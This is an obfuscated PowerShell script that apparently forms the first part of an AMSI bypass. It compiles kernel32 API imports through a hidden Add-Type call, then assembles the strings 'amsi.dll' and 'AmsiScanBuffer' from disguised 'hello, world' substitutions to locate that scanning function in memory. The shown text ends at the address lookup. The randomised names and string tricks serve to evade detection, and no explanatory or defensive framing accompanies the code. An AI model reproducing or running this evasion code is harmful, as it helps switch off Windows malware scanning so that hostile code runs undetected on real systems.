$bYKHXkzoi2je7US = 0x50000
$TAuN= 0x50000
$k2zlfZjEi = 0x2000000
$p4l9R = 0x50000


$miHh6vr0Z1 = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class APIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
    public static int Dummy() {
         return 1;
    }
}
"@

& ([string]::join('', ( (65,100,100,45,84,121,112,101) |%{ ( [char][int] $_)})) | % {$_}) $miHh6vr0Z1

$EzTBcaPi2=& (("0-Syl6gaduZTRUOGjF34kMCb7YvmfVIhE2ispno1XcLD8BtAHPxQWqw9zreJKN5")[15,58,46,1,43,7,46,58] -join '');

$2XNA7o9gHWDMsVzu5wqcjm4Ir = 'hello, world'
$2XNA7o9gHWDMsVzu5wqcjm4Ir = $2XNA7o9gHWDMsVzu5wqcjm4Ir.replace('he','a')
$2XNA7o9gHWDMsVzu5wqcjm4Ir = $2XNA7o9gHWDMsVzu5wqcjm4Ir.replace('ll','m')
$2XNA7o9gHWDMsVzu5wqcjm4Ir = $2XNA7o9gHWDMsVzu5wqcjm4Ir.replace('o,','s')
$2XNA7o9gHWDMsVzu5wqcjm4Ir = $2XNA7o9gHWDMsVzu5wqcjm4Ir.replace(' ','i')
$2XNA7o9gHWDMsVzu5wqcjm4Ir = $2XNA7o9gHWDMsVzu5wqcjm4Ir.replace('wo','.d')
$2XNA7o9gHWDMsVzu5wqcjm4Ir = $2XNA7o9gHWDMsVzu5wqcjm4Ir.replace('rld','ll')

$string2fgyorzCHKcbSqtBN = 'hello, world'
$string2fgyorzCHKcbSqtBN = $string2fgyorzCHKcbSqtBN.replace('he','A')
$string2fgyorzCHKcbSqtBN = $string2fgyorzCHKcbSqtBN.replace('ll','m')
$string2fgyorzCHKcbSqtBN = $string2fgyorzCHKcbSqtBN.replace('o,','s')
$string2fgyorzCHKcbSqtBN = $string2fgyorzCHKcbSqtBN.replace(' ','i')
$string2fgyorzCHKcbSqtBN = $string2fgyorzCHKcbSqtBN.replace('wo','Sc')
$string2fgyorzCHKcbSqtBN = $string2fgyorzCHKcbSqtBN.replace('rld','an')

$string3OUDFJF2qHx6a3einL = 'hello, world'
$string3OUDFJF2qHx6a3einL = $string3OUDFJF2qHx6a3einL.replace('hello','Bu')
$string3OUDFJF2qHx6a3einL = $string3OUDFJF2qHx6a3einL.replace(', ','ff')
$string3OUDFJF2qHx6a3einL = $string3OUDFJF2qHx6a3einL.replace('world','er')

$uaI6WGoB9yMQJO = [APIS]::GetModuleHandle($2XNA7o9gHWDMsVzu5wqcjm4Ir)
[IntPtr] $3m0pQxb67Kucl = [APIS]::GetProcAddress($uaI6WGoB9yMQJO, $string2fgyorzCHKcbSqtBN + $string3OUDFJF2qHx6a3einL)


